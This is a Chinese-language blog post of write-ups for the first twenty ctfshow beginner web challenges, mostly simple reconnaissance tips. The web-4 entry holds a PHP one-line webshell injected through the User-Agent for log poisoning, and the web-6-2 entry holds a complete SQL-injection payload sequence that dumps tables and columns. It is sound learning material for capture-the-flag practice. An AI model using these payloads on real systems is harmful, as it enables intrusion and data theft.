---
title: web入门
date: 2023年5月12日13:25:15
tags: web
---

### ctfshow第一类:信息收集

##### web-1

打开以后直接查看源码就可以了

##### web-2

```
有几种办法
1.ctrl  u查看源码，注释里的就是
2.在url前面添加view-source:
```

##### web-3

bp抓包重发就行了

##### web-4-1

第四个和B站上给的不一样，是一个文件泄露的

wp说上来可以用php伪协议进行

```
?url=php://input放到url后面

<?php system('ls ./');?>放到最后
```

返回error

然后bp抓包发现是nginx的，使用

```
?url=/var/log/nginx/access.log
```

查看日志文件

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 12 May 2023 06:20:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.3.11
Content-Length: 5003

172.12.0.6 - - [12/May/2023:05:48:15 +0000] "GET / HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:48:40 +0000] "GET /robots.txt HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:50:31 +0000] "GET /index.php HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:50:37 +0000] "GET /index.php HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:52:15 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 1367 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:53:41 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 1554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:53:51 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 1741 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:54:41 +0000] "GET /?url=php://input HTTP/1.1" 200 15 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:56:21 +0000] "GET /?url=php://input HTTP/1.1" 200 15 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:58:04 +0000] "GET /?url=/etc/passwd HTTP/1.1" 200 2107 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:05:58:28 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 2443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:06:01:17 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 2630 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:06:15:45 +0000] "POST /?url=/var/log/nginx/access.log HTTP/1.1" 200 2817 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36"
172.12.0.6 - - [12/May/2023:06:15:47 +0000] "POST /?url=/var/log/nginx/access.log HTTP/1.1" 200 3032 "-" "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3"
172.12.0.6 - - [12/May/2023:06:15:48 +0000] "POST /?url=/var/log/nginx/access.log HTTP/1.1" 200 3205 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36"
172.12.0.6 - - [12/May/2023:06:17:51 +0000] "POST /?url=/var/log/nginx/access.log HTTP/1.1" 200 3418 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
172.12.0.6 - - [12/May/2023:06:17:56 +0000] "POST /?url=/var/log/nginx/access.log HTTP/1.1" 200 3633 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
172.12.0.6 - - [12/May/2023:06:17:58 +0000] "POST /?url=/var/log/nginx/access.log HTTP/1.1" 200 3843 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
172.12.0.6 - - [12/May/2023:06:19:16 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 4086 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:06:20:01 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 4273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:06:20:01 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 4461 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:06:20:02 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 4648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
172.12.0.6 - - [12/May/2023:06:20:02 +0000] "GET /?url=/var/log/nginx/access.log HTTP/1.1" 200 4829 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
    <title>ctf.show_web4</title>
</head>
<body>
    <center>
    <h2>ctf.show_web4</h2>
    <hr>
    <h3>
    <code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php&nbsp;</span><span style="color: #007700">include(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'url'</span><span style="color: #007700">]);</span><span style="color: #0000BB">?&gt;</span>
</span>
</code>    </center>

</body>
</html>

```

然后在user-agent后面加了一个

```
<?php eval($_POST['cmd']); ?>
```

一句话木马，使用蚁剑连接

密码就是cmd

在var/www/下面找到flag.txt

##### web-4-2

机器人协议robots.txt

机器人协议，爬虫协议，本质是网站和搜索引擎爬虫的沟通方式，用来指导搜索引擎更好地抓取网站内容，



##### web-5

```

ctf.show_web5
where is flag?
<?php
error_reporting(0);
    
?>
<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
    <title>ctf.show_web5</title>
</head>
<body>
    <center>
    <h2>ctf.show_web5</h2>
    <hr>
    <h3>
    </center>
    <?php
        $flag="";
        $v1=$_GET['v1'];
        $v2=$_GET['v2'];
        if(isset($v1) && isset($v2)){
            if(!ctype_alpha($v1)){
                die("v1 error");
            }
            if(!is_numeric($v2)){
                die("v2 error");
            }
            if(md5($v1)==md5($v2)){
                echo $flag;
            }
        }else{
        
            echo "where is flag?";
        }
    ?>

</body>
</html>

```

这道题限制第一个只能是字母第二个只能是数字

第一个和第二个的md5值要相等

可以使用md5的0E绕过，详细可以来看这个

```
https://blog.csdn.net/wangyuxiang946/article/details/119845182
```

##### web-6-1

这是一个文件泄露的题目，可以用www.zip下载备份文件

##### web-6-2

不懂为什么，我再打开一次这个是一个sql注入的题目

输入万能钥匙发现过滤了空格，

```
一般空格被过滤有如下替换方法
1./**/
2.()
3.回车(url编码中的%0a)
4.`(tap键上面的按钮)
5.tap
6.两个空格

```

我们就选用/**/来替换空格

输入

```
username=1'/**/or/**/1=1/**/union/**/select/**/1,2,3/**/#&password=123（判断回显位置）password随便写就行
username=123'/**/or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/#&password=123  #获取表名
username=123'/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='flag'/**/#&password=123  #获取列名
username=123'/**/or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag/**/#&password=123  #拿到flag
```

##### web-7
##### web-8
都是一样的，找到注入点后用python自动化脱库脚本爆破就好了


##### web-9
vim在异常关闭时会产生swp可交换文件

这道题的答案就是在里面的

##### web-10

将flag放到cookie里面，刷新网页然后使用F12查看cookie即可



#### 1-10总结

前十个里面有这么几种信息收集的方式

cookie

swp交换文件

sql注入

源码，注释，bp抓包里面

绕过md5的0E等等

robots.txt爬虫协议

##### web-11

网站的域名也会隐藏信息

这道题中用http://dbcha.com/可以直接获得（A记录改成txt

##### web-12

这个题目中，他是一个网站

登录到/admin里面以后

要求输入账户密码，账户使用默认账户，密码的话网站中可能存在，所以找了找试了试最下面的电话，成功

*常见的渗透思路*

##### web-13

这个是一个考眼力的题目，他在最下面第三个里有一个唯一小些的document,并且可以打开文档。里面有这个东西的使用

说明，值得注意的是，里面的

http://your-domain/是你的域名的意思，在这个题目中的意思就是直接套到靶场的环境上就可以

##### web-14

打开之后是一个巨信的界面

提示说是编译器的问题，所以要在源码中搜索editor

发现一个这个

```
<img src="editor/upload/banner-app.png" alt="App">
```

说明是有编译器的（据说是百度的

```
http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/editor/
```

打开以后可以看到有一系列的文件上传什么的，在插入文件的文件空间中

```
/editor/attached/file/var/www/html/nothinghere/fl000g.txt
```

发现这么个东西

输入到url不对，看了show的视频说是（注意url形式

```
/editor/attached/file/这一段是编译器的绝对路径
var/www/html/
nothinghere/fl000g.txt只需要输入这个就可以了
```

```
http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/nothinghere/fl000g.txt
```

##### web-15

有点社工的感觉，这道题有个邮箱提示，在网站中输入admin可以进入管理员登录界面，刚开始输入邮箱作为密码会提示密码错误，但是有一个忘记密码

忘记密码的提示是我生活在什么城市，这个可以通过QQ邮箱来进行社工，找到以后就OK了



##### web-16

打开是一个元素周期表，提示说是探针忘记删除了，所以可以通过tz.php进行查看参数，在里面找flag

##### web-17

备份的sql文件会泄露数据

backup.sql直接进就行

##### web-18

这道题在源码中找js文件，js里面有一个gameover

```
\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b)
```

在控制台中构造一个alert即可

##### web-19

在源码中看到

```
 if(isset($u) && isset($p)){
        if($u==='admin' && $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){
            echo $flag;
        }
}
```

往上看的话看到p=pazzword，u=username，post传参即可

##### web-20

这个是一个数据库的题，他说自己是

```
我是asp程序，我用的access数据库
```

看了看视频说可以尝试mdb.db或者data.db或db.mdb，第三个成功了

用查看器查看就能得到（注意要拉开表

#### web信息收集总结

主要还是靠眼力,另外,swp,sql,数据库,探针,编译器等等也会泄露信息

此外post传参,源码,等等的也会，做题的时候注意一下
